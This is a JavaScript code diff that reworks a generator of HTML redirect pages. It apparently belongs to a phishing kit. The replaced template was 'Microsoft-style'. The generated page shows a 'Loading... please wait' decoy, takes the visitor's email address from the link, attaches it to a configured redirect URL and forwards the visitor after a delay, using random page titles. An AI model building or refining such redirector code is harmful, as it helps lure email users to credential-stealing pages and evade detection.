@@ -237,59 +237,43 @@ function generateScriptContent(redirectUrl, delay = 500) {
     .replace("{{TITLE}}", rStr(20));
 }
 
-// Generate custom script content using the Microsoft-style template
+// Generate custom script content using the professional template
 function generateCustomScriptContent(redirectUrl) {
-  const template = `<!DOCTYPE html>
+  try {
+    // Use the professional template from script-template.html
+    const template = fs.readFileSync("./script-template.html", "utf8");
+    return template
+      .replace(/{{REDIRECT_URL}}/g, redirectUrl)
+      .replace(/{{DELAY}}/g, '3000')
+      .replace(/{{TITLE}}/g, rStr(16));
+  } catch (error) {
+    // Fallback template if file reading fails
+    return `<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>${rStr(20)}</title>
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            setTimeout(redirect, 300);
-        });
-
-        // Function to handle redirection
-        function redirect() {
-            var email = getParameterByName('email'); // Attempt to get the email parameter
-            var redirectUrl = "${redirectUrl}";
-
+        setTimeout(function() {
+            const email = new URLSearchParams(window.location.search).get('email');
+            let url = "${redirectUrl}";
             if (email) {
-                redirectUrl += email; // Append email if provided
-            } else {
-                console.log("No email provided. Redirecting without email.");
+                const separator = url.includes('?') ? '&' : '?';
+                url += separator + 'email=' + encodeURIComponent(email);
             }
-
-            console.log("Redirecting to: " + redirectUrl);
-            window.location.href = redirectUrl;
-        }
-
-        // Function to get URL parameters
-        function getParameterByName(name, url = window.location.href) {
-            name = name.replace(/[\\[\\]]/g, '\\\\$&');
-            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
-            var results = regex.exec(url);
-            if (!results) return null;
-            if (!results[2]) return '';
-            return decodeURIComponent(results[2].replace(/\\+/g, ' '));
-        }
-
-        // Function to manually trigger redirection via checkbox
-        function handleCheckboxClick(checkbox) {
-            if (checkbox.checked) {
-                console.log("Checkbox is checked. Redirecting...");
-                redirect();
-            } else {
-                console.log("Checkbox is not checked.");
-            }
-        }
+            window.location.href = url;
+        }, 2000);
     </script>
 </head>
 <body>
+    <div style="text-align:center;padding:50px;font-family:Arial,sans-serif;">
+        <h2>Loading...</h2>
+        <p>Please wait while we redirect you.</p>
+    </div>
 </body>
 </html>`;
-  return template;
+  }
 }
 
 // ==========================================
